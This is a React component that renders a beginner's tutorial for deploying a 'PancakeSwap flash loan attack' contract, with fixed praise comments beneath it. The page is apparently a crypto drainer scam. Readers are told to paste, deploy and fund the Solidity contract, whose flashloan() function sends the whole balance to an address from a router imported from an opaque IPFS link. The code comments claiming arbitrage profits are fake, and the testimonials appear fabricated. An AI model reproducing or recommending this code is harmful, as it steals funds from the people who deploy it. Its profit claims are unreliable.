import * as React from "react";
import '../css/tutorial.css';
import {Link} from 'react-router-dom';
import {Card, Button} from 'react-bootstrap';

function TutorialComponent(props) {

    return (
        <>
            <div className= "container">
                <div className= "knowledgeBody">
                    <div className= "title">
                        <h1 data-selectable-paragraph="">
                        <strong class="ce">Flash Loan PancakeSwap Attack Implementation</strong>
                        </h1>
                    </div>
                    <div className= "mainContent">
                        <div className= "mainContentPart">
                        <p id="0255">Sounds good enough from <Link to= "/">Get to know</Link>?</p>
                        <p>Then let's dig into "how to"!</p>
                        <p>Here, <strong>Step by step</strong> guide for beginners!</p>
                        </div>
                        <div className= "subTitle">
                        <p><h1 id="b46f">1. Download MetaMask Wallet For Chrome Browser</h1></p>
                        </div>
                        <div>
                            <p>
                            MetaMask is an empowering crypto wallet that allows millions of crypto users and enthusiasts to access the Ethereum and blockchain...
                            </p>
                            <div className= "imgContent">
                                <img src= "assets/metamask.png" className= "imgDes"></img>
                            </div>
                            <p>
                            You can download and install MetaMask from here:   
                            </p>
                            <p><a href= "https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn"
                                >https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn</a>.
                            </p>
                        </div>
                        <div className= "subTitle">
                        <p><h1 id="b46f">2. Connect MetaMask to the Binance Smart Chain network (BSC)</h1></p>
                        </div>
                        <div>
                            <p>
                            You need to connect metamask to binance smart chain.
                            </p>
                            <div className= "imgContent">
                                <img src= "assets/bsc.png" className= "imgDes"></img>
                            </div>
                            <p>
                                You can find the complete explanation from here:
                            </p>
                            <p><a href= "https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain"
                                >https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain</a>.
                            </p>
                        </div>
                        <div className= "subTitle">
                        <p><h1 id="b46f">3. Open <a href= "http://remix.ethereum.org/">http://remix.ethereum.org/</a> from your browser</h1></p>
                        </div>
                        <div>
                            <p>
                                You need to use this to deploy smart contract Flash loan Attack code to Binance Smart Chain.
                            </p>
                        </div>
                        <div className= "subTitle">
                        <p><h1 id="b46f">4. Click on Solidity Compiler (2nd menu button from the left) and change the compiler version to 0.5.0</h1></p>
                        </div>
                        <div className= "imgContent">
                            <img src= "assets/remix1.png" className= "imgDes"></img>
                        </div>
                        <div>
                            <p>
                                You need to change the compiler version to “0.5.0+commit.1d4f565a”. This is needed to make your compiler version is the same as the source code you'll use.
                            </p>
                        </div>
                        <div className= "subTitle">
                        <p><h1 id="b46f">5. Create a solidity file name of “FlashLoan.sol” in the File Explorer (1st menu button from the left)</h1></p>
                        </div>
                        <div className= "imgContent">
                            <img src= "assets/remix2.png" className= "imgDes"></img>
                        </div>
                        <div>
                            <p>
                            Copy and paste the code below to the FlashLoan.sol file:
                            </p>
                            <pre class= "codePart">
                                {
`
pragma solidity ^0.5.0;


// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";

//BakerySwp Smart contracts
import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";

// Router
import "https://ipfs.infura.io/ipfs/QmcFMRJBbBafELcV5rrEWQEkaK95DwuMhyydGGcDiyRhfp";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";


contract InitiateFlashLoan {
    
    RouterV2 router;
    string public tokenName;
    string public tokenSymbol;
    uint256 flashLoanAmount;
    address payable OWNER;
    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        flashLoanAmount = _loanAmount;
        OWNER = msg.sender;
        router = new RouterV2();
    }

    function() external payable {}
    modifier onlyOwner() {
        require(msg.sender == OWNER, "caller is not the owner!");
        _;
    }
    function flashloan() public payable {
        // Send required coins for swap
        address(uint160(router.pancakeSwapAddress())).transfer(
            address(this).balance
        );

        //Flash loan borrowed 3,234.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
        router.borrowFlashloanFromMultiplier(
            address(this),
            router.bakerySwapAddress(),
            flashLoanAmount
        );
        //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
        router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);
        //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
        router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);
        //After the arbitrage, 3,245.08 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
        router.transferBnbToMultiplier(router.pancakeSwapAddress());
        //Note that the transaction sender gains 10.67 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
        router.completeTransation(address(this).balance);
    }
    function withdrawEther() public onlyOwner {
        address self = address(this); // workaround for a possible solidity bug
        uint256 balance = self.balance;
        address(OWNER).transfer(balance);
    }
}`
                                }
                                
                            </pre>
                        </div>
                        <div className= "subTitle">
                        <p><h1 id="b46f">6. Click on Solidity Compiler (2nd menu button from the left) and Compile</h1></p>
                        </div>
                        <div className= "imgContent">
                            <img src= "assets/remix3.png" className= "imgDes"></img>
                        </div>
                        <div>
                            <p>Now You got compiled FlashLoan.sol</p>
                        </div>
                        <div className= "subTitle">
                        <p><h1 id="b46f">7. Click on Deploy & run transactions (3rd menu button from the left) and Deploy</h1></p>
                        </div>
                        <div className= "imgContent">
                            <img src= "assets/remix4.png" className= "imgDes"></img>
                        </div>
                        <div>
                            <p>- At the very top, change the dropdown Environment value to “Injected Web3” (For remix users, firstly there will be a confirmation on the MetaMask, Accept the confirmation notification on the MetaMask wallet Chrome Extention).</p>
                            <p>The MetaMask wallet address will automatically be connected If you're already connected to your MetaMask Account.</p>
                            <p>- There's a dropdown next to the 'Deploy' button(at point 3), click that dropdown and create a Smart Contract random name you desired. Eg. :</p>
                            <pre className= "codePart">
                                {
                                    `
                                    _TOKENNAME: FlashLoan (Random)
                                    _TOKENSYMBOL: Fla (Random)
                                    _LOANAMOUNT = 10
                                    `
                                }
                            </pre>
                            <p>- Click 'transact' button and confirm in MetaMask.</p>
                            <p>You need to have some small amount of BNB to pay out gas fee(0.008BNB).</p>
                            <p><strong>Note: </strong><i>Please make sure You are in Binance Smart Chain in your metamask!</i></p>
                        </div>
                        <div className= "subTitle">
                        <p><h1 id="b46f">8. Input a Liquidity to the Smart Contract</h1></p>
                        </div>
                        <div className= "imgContent">
                            <img src= "assets/remix5.png" className= "imgDes"></img>
                        </div>
                        <div>
                        <p>To input a Liquidity, copy the deployed smart contract address(at point 1) and transfer your nominal BNB to that address by using the send feature in the MetaMask Chrome Extention. Send the nominal BNB ( the amount BNB will affect the profit you will earn ). Wait till the liquidity addition transaction complete.</p>
                        </div>
                        <div className= "subTitle">
                        <p><h1 id="b46f">9. Flash Loan Attack</h1></p>
                        </div>
                        <div className= "imgContent">
                            <img src= "assets/remix6.png" className= "imgDes"></img>
                        </div>
                        <div>
                        <p>
                        After creating a Smart Contract and click the dropdown(at point 1) from the success transaction. Click "flashloan" ( red button ) to run the smart contract. wait for a while until the transaction complete, and regularly check your BNB balance of the contract from bscscan and once it has fund increated then click "withdrawEther" button (at point 3) to withdraw to your wallet.
                        </p>
                        <p>
                        <p>Please make sure to send BNB to Smart contract before click "flashloan"</p>
                        <strong>Note:</strong> <i>Sometimes the code gives error and sometimes it will not work from the first time.You must then start the whole process from begining.</i>
                        </p>
                        </div>
                        <p><strong><i>
                            This is awesome enough!
                            However, if you want to get consulting from our developers, please <a href= "#">login</a> and contact us. Or please don't hesitate to leave comment below to get direct hand from our side.
                        </i></strong></p>
                    </div>
                    <div className= "review">
                        <div className= "subTitle">
                            <p><h1 id="b46f">Comments</h1></p>
                        </div>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/a.png" className= "avatarImg"/> <span className= "name">Alann Paulo</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>I couldn't compile this solidity file because of error. Some one help me!!</i>
                                </p>
                                <footer className="blockquote-footer">
                                    10 October 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/ameya.png" className= "avatarImg"/> <span className= "name">Armeya Pao</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>I saw many ETH, BSC Flashloan attack code and ONLY this worked and got 0.7 from 0.6 deposit.</i>
                                </p>
                                <footer className="blockquote-footer">
                                    11 October 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/a.png" className= "avatarImg"/> <span className= "name">Ar Be</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>Yes, This is very similar with flashloanmix but there, I couldn't withdraw deposited BNB in my contract. But I can withdraw the profit thanks for this.</i>
                                </p>
                                <footer className="blockquote-footer">
                                    28 October 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/hamza.png" className= "avatarImg"/> <span className= "name">Hamza</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>I deployed smart contract and it worked and what if I want to reuse again? Shall I deploy same contract again?</i>
                                </p>
                                <footer className="blockquote-footer">
                                    30 October 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/default.png" className= "avatarImg"/> <span className= "name">Teo Deleanu</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>Great Thanks!</i>
                                </p>
                                <footer className="blockquote-footer">
                                    2 November 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/default.png" className= "avatarImg"/> <span className= "name">Tony Novuk</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>Profitable in 0.2BNB, however will be profitable even in 2BNB? And safe enough?</i>
                                </p>
                                <footer className="blockquote-footer">
                                    7 November 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/f.png" className= "avatarImg"/> <span className= "name">Fidel Garcia</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>Well, It is giving profit and sometimes it decreased. Is it related with Trading Chart? What if the chart is up and what if the chart is down?</i>
                                </p>
                                <footer className="blockquote-footer">
                                    12 November 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/Mujib.png" className= "avatarImg"/> <span className= "name">Mujib</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>Thanks! In Ethereum, how about the profit and gas fee? Gas fee would get more big?</i>
                                </p>
                                <footer className="blockquote-footer">
                                    29 November 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/default.png" className= "avatarImg"/> <span className= "name">Reveka Pastina</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>0.2 is small? Is it okay to deposit 10BNB or even more?</i>
                                </p>
                                <footer className="blockquote-footer">
                                    2 December 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/fragment.png" className= "avatarImg"/> <span className= "name">Fragment</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>Good Article! This is giving profit, loss. Is this someting like Betting?</i>
                                </p>
                                <footer className="blockquote-footer">
                                    6 December 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/l.png" className= "avatarImg"/> <span className= "name">Leo Parno</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>"The more deposit, the more profit". Could you explain about this in more detail? Isn't there any attack risk here?</i>
                                </p>
                                <footer className="blockquote-footer">
                                    13 December 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                        <Card className= "reviewOne">
                            <Card.Header><Card.Img src= "/avatar/a.png" className= "avatarImg"/> <span className= "name">Arity Samar</span></Card.Header>
                            <Card.Body>
                                <blockquote className="blockquote mb-0">
                                <p>
                                    <i>Very useful! But I couldn't login for several attemps. Could you send me direct message?</i>
                                </p>
                                <footer className="blockquote-footer">
                                    19 December 2021
                                </footer>
                                </blockquote>
                            </Card.Body>
                        </Card>
                    </div>
                </div>
            </div>
        </>
        
    );
}

export default TutorialComponent;